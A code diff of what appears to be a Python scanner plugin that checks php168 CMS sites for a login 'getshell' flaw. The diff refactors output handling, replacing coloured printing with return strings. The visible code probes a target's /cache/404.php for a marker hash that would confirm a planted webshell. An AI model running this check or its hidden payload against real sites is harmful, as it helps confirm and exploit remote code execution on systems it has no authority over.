@@ -8,8 +8,8 @@ description: Powered by php168 v6或者一下版本v5、v4、v3、v2、v1会搜�
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class php168_login_getshell_BaseVerify():
     def __init__(self, url):
@@ -26,12 +26,12 @@ class php168_login_getshell_BaseVerify():
             verifyurl = self.url + "/cache/404.php"
             req2 = requests.get(verifyurl, headers=headers, timeout=10, verify=False)
             if r"81dc9bdb52d04dc20036dbd8313ed055" in req2.text:
-                cprint("[+]存在PHP168 GETSHELL漏洞...(高危)\tpayload: "+verifyurl, "red")
+                return "[+]存在PHP168 GETSHELL漏洞...(高危)\tpayload: "+verifyurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = php168_login_getshell_BaseVerify(sys.argv[1])
     testVuln.run()
